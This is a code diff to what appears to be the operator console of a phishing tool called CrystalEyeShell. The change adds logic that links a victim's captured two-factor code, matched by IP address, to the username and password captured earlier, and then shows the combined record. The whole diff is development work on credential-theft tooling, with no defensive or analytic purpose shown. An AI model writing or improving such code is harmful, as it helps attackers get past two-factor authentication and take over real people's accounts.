@@ -83,5 +83,10 @@ class CrystalEyeShell:
     def on_credential_captured(self, credential: Credential) -> None:
         """Callback invoked from server thread when credentials arrive."""
         if self.cred_repo:
-            credential = self.cred_repo.save(credential)
+            is_2fa = "2fa_code" in credential.fields and len(credential.fields) == 1
+            if is_2fa:
+                merged = self.cred_repo.merge_by_ip(credential)
+                credential = merged if merged else self.cred_repo.save(credential)
+            else:
+                credential = self.cred_repo.save(credential)
         display_credential_panel(self.console, credential)
